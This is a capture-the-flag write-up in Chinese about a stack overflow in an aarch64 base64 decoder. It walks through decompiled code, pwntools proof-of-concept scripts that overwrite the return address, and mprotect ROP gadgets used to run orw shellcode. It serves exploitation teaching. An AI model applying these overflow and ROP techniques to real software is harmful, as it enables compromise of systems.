
## 漏洞点寻找

```c
__int64 __fastcall decode(char *json_input, __int64 out_put)
{
int v3; // w0
int v4; // w0
int v5; // w0
int v6; // w0
int v7; // w0
int v8; // w0
int v9; // w0
int v10; // w0
int v11; // w0
int v12; // w0
int v13; // w0
char v16[1028]; // [xsp+28h] [xbp+28h]
int v17; // [xsp+42Ch] [xbp+42Ch]
int v18; // [xsp+430h] [xbp+430h]
int v19; // [xsp+434h] [xbp+434h]
int v20; // [xsp+438h] [xbp+438h]
int v21; // [xsp+43Ch] [xbp+43Ch]
unsigned int size; // [xsp+440h] [xbp+440h]
unsigned int v23; // [xsp+444h] [xbp+444h]
unsigned int v24; // [xsp+448h] [xbp+448h]
unsigned int len; // [xsp+44Ch] [xbp+44Ch]
size = sub_400300();
if ( (size & 3) != 0 )
return 0LL;
len = 3 * (size >> 2);
if ( json_input[size - 1] == '=' )
--len;
if ( json_input[size - 2] == 61 )
--len;
if ( out_put )
{
v24 = 0;
v23 = 0;
while ( size > v24 )
{
if ( json_input[v24] == 61 )
{
++v24;
v3 = 0;
}
else
{
v4 = v24++;
v3 = byte_4A1F98[json_input[v4]];
}
v21 = v3;
if ( json_input[v24] == 61 )
{
++v24;
v5 = 0;
}
else
{
v6 = v24++;
v5 = byte_4A1F98[json_input[v6]];
}
v20 = v5;
if ( json_input[v24] == 61 )
{
++v24;
v7 = 0;
}
else
{
v8 = v24++;
v7 = byte_4A1F98[json_input[v8]];
}
v19 = v7;
if ( json_input[v24] == 61 )
{
++v24;
v9 = 0;
}
else
{
v10 = v24++;
v9 = byte_4A1F98[json_input[v10]];
}
v18 = v9;
v17 = v9 + (v21 << 18) + (v20 << 12) + (v19 << 6);
if ( len > v23 )
{
v11 = v23++;
v16[v11] = BYTE2(v17);
}
if ( len > v23 )
{
v12 = v23++;
v16[v12] = BYTE1(v17);
}
if ( len > v23 )
{
v13 = v23++;
v16[v13] = v17;
}
}
sub_4002B0();
}
return 0LL;
}
```

在 `decode()` 最前面，会得到长度。如果 `decode()` 的时候存在 `=` 号，则 `len--`。可以看到最后对 `v16` 的索引并没有进行大小检查，导致溢出。

到此漏洞点寻找完成。

## 漏洞利用

接下来就是如何去利用这个漏洞，首先看一下保护：

```bash
Arch: aarch64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

可以直接覆盖返回地址来劫持程序流，写出如下 poc：

```python
from pwn import *
from os import system
import base64
li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
file_name = './base64'
r = process([file_name, 'call', 'decode'])
def dbgg():
raw_input()
elf = ELF(file_name)
dbgg()
p1 = b'aaaa'
p1 = p1.ljust(0x458, b"a")
p1 = base64.b64encode(p1)
ret = 0x406550
li(p1)
p2 = b'{"input":"' + p1 + b'"}'
li(p2)
r.sendline(p2)
r.interactive()
```

调试的时候发现会在下面这个地方 `SIGSEGV` 了：

```text
► 0x406280 ldrb w0, [x0]
0x406284 cmp w0, #0x3d
0x406288 b.ne #0x4062a0 <0x4062a0>
```

看一下汇编：

```asm
.text:0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
.text:0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
.text:000000000040627C 20 00 00 8B ADD X0, X1, X0
.text:0000000000406280 00 00 40 39 LDRB W0, [X0]
.text:0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='
```

`X0` 这里的地址取错了，`0x450 - 8 = 0x448 = v24`，在溢出的时候把 `v24` 给覆盖了之后导致的 `SIGSEGV` 结果。

所以需要把 `v22`、`v23`、`v24`、`v25` 都处置正确才可以继续。

所以写了如下 poc：

```python
from pwn import *
from os import system
import base64
li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
file_name = './base64'
r = process([file_name, 'call', 'decode'])
def dbgg():
raw_input()
elf = ELF(file_name)
dbgg()
p1 = b''
p1 = p1.ljust(0x418, b'a')
p1 += b'\x77\x77\x00\x00'
p1 += b'\x1d\x04\x00\x00' #0x418 + 0x4 + 1
p1 += b'\x84\x05\x00\x00' #
p1 += b'\x77\x07\x00\x00'
p1 += p64(0)
p1 += b'b' * 8
p1 = base64.b64encode(p1)
ret = 0x406550
li(p1)
p2 = b'{"input":"' + p1 + b'"}'
li(p2)
r.sendline(p2)
r.interactive()
```

发现可以成功控制 `ret` 为 `0x6262626262626262`，接下来就是构造 ROP。

没找到 `system`，但是发现了 `mprotect`：

```c
unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
{
unsigned __int64 result; // x0
int v4; // w1
result = linux_eabi_syscall(__NR_mprotect, a1, a2, a3);
if ( result >= 0xFFFFFFFFFFFFF001LL )
{
v4 = result;
result = -1LL;
*(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = -v4;
}
return result;
}
```

如果可以控制 `a1`、`a2`、`a3`，就可以直接分配 `rwx` 来执行 shellcode。用 rwctf shellfind 的方法来看交叉引用，从而寻找可以控制 `a1`、`a2`、`a3` 中的一个，并且可以同时执行 `sub_423340` 的地址。

这样做的原因是因为笔者直接寻找借助 `x21`、`x19` 然后 `mov` 到 `x1`、`x2` 的 gadgets，但是控制之后执行 `sub_423340` 会因为 `x21`、`x19` 的设置导致一些问题。

如果可以控制 `a1`、`a2`、`a3` 中的任何一个，并且可以执行 `sub_423340`，这个时候就可以跳到 shellcode 那里了。

```asm
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
```

上面这一段就符合要求，控制了 `x19` 之后，再控制 `x2`，最后到达上面这一段。

```asm
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
```

官方 wp 上的要更简单，控制 `x0` 即可，然后跳到 shellcode 那里。

shellcode 可以用 `orw`，下面是使用 `base64` 运行时的 exp，可以看到 `flag` 成功被输出。
